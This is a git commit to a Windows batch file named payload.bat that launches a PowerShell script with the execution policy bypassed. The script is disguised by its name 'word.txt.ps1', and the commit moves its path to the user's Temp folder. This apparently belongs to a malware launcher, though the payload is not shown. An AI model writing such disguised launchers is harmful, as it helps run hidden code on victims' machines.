444fe40bb12ebb0d15ec31ec9084b1b07d6bdf54
econx1 <nati09105312@gmail.com>
2025-09-01 18:55:45 -0400

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -1,3 +1,3 @@
 @echo off
-powershell.exe -noprofile -executionpolicy bypass -file "C:\Users\econt\Desktop\word.txt.ps1"
+powershell.exe -noprofile -executionpolicy bypass -file "C:\Users\econt\AppData\Local\Temp\word.txt.ps1"
 pause
